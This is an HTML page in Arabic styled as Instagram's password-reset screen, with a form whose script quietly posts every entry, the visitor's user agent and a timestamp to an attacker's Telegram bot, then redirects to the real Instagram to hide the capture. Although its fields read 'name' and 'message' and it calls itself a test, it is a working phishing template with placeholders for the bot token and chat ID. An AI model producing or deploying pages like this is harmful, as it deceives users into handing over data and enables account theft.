<!DOCTYPE html>
<html id="html" lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>إعادة تعيين كلمة السر • Instagram</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #fafafa;
      color: #262626;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .logo {
      text-align: center;
      font-size: 42px;
      font-weight: 600;
      margin-top: 30px;
      margin-bottom: 10px;
      letter-spacing: -1px;
      color: #262626;
      user-select: none;
    }

    .wrapper {
      width: 100%;
      max-width: 400px;
      margin: 20px auto 0;
      padding: 0 20px;
    }

    .title {
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 12px;
      text-align: right;
    }

    .subtitle {
      font-size: 14px;
      color: #8e8e8e;
      margin-bottom: 20px;
      line-height: 1.5;
      text-align: right;
    }

    .input-wrapper {
      position: relative;
      width: 100%;
      margin-bottom: 20px;
    }

    .input-wrapper input {
      width: 100%;
      padding: 14px 12px 6px;
      font-size: 16px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background: #fafafa;
      transition: border-color 0.2s ease;
    }

    .input-wrapper input:focus {
      outline: none;
      border-color: #a8a8a8;
      background: #fff;
    }

    .input-wrapper label {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 14px;
      color: #8e8e8e;
      pointer-events: none;
      transition: 0.2s ease;
    }

    .input-wrapper input:focus + label,
    .input-wrapper input:not(:placeholder-shown) + label {
      top: 6px;
      font-size: 11px;
      color: #737373;
    }

    .btn {
      width: 100%;
      background-color: #0095f6;
      color: #fff;
      padding: 9px 0;
      border: none;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 6px;
    }

    /* شاشة التحميل */
    .loading-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #ffffffee;
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .loading-text {
      font-size: 28px;
      font-weight: 600;
      color: #262626;
      animation: wave 1.2s infinite ease-in-out;
    }

    @keyframes wave {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
  </style>
</head>

<body>

  <div class="logo">Instagram</div>

  <div class="wrapper">
    <h1 class="title">إعادة تعيين كلمة السر</h1>

    <p class="subtitle">قم بإدخال اسمك ورسالتك للتجربة.</p>

    <!-- حقل الاسم -->
    <div class="input-wrapper">
      <input type="text" id="name" placeholder=" " required />
      <label for="name">الاسم</label>
    </div>

    <!-- حقل الرسالة -->
    <div class="input-wrapper">
      <input type="text" id="message" placeholder=" " required />
      <label for="message">الرسالة</label>
    </div>

    <button class="btn" id="submitBtn">متابعة</button>
  </div>

  <!-- شاشة التحميل -->
  <div class="loading-screen" id="loadingScreen">
    <div class="loading-text" id="loadingText">جاري التحميل...</div>
  </div>

  <script>
    // إعداد اللغة
    const userLang = navigator.language || navigator.userLanguage;
    const html = document.getElementById("html");
    const loadingText = document.getElementById("loadingText");

    if (userLang.startsWith("ar")) {
      html.lang = "ar";
      html.dir = "rtl";
      loadingText.innerText = "جاري التحميل...";
    } else {
      html.lang = "en";
      html.dir = "ltr";
      loadingText.innerText = "Loading...";
    }

    // ضع التوكن والـ Chat ID بنفسك هنا
    const BOT_TOKEN = "PUT_YOUR_TOKEN_HERE";
    const CHAT_ID = "PUT_YOUR_CHAT_ID_HERE";

    function sendToTelegram(name, message) {
      const text = `
📝 *بيانات جديدة من صفحة الاختبار*
━━━━━━━━━━━━
👤 الاسم: ${name}
💬 الرسالة: ${message}
📱 الجهاز: ${navigator.userAgent}
⏰ الوقت: ${new Date().toLocaleString()}
━━━━━━━━━━━━
`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: "Markdown"
        })
      });
    }

    // عند الضغط على متابعة
    document.getElementById("submitBtn").addEventListener("click", () => {
      const name = document.getElementById("name").value;
      const message = document.getElementById("message").value;

      // إرسال البيانات
      sendToTelegram(name, message);

      // شاشة التحميل
      const loading = document.getElementById("loadingScreen");
      loading.style.display = "flex";

      setTimeout(() => {
        window.location.href = "https://www.instagram.com";
      }, 2000);
    });
  </script>

</body>
</html>
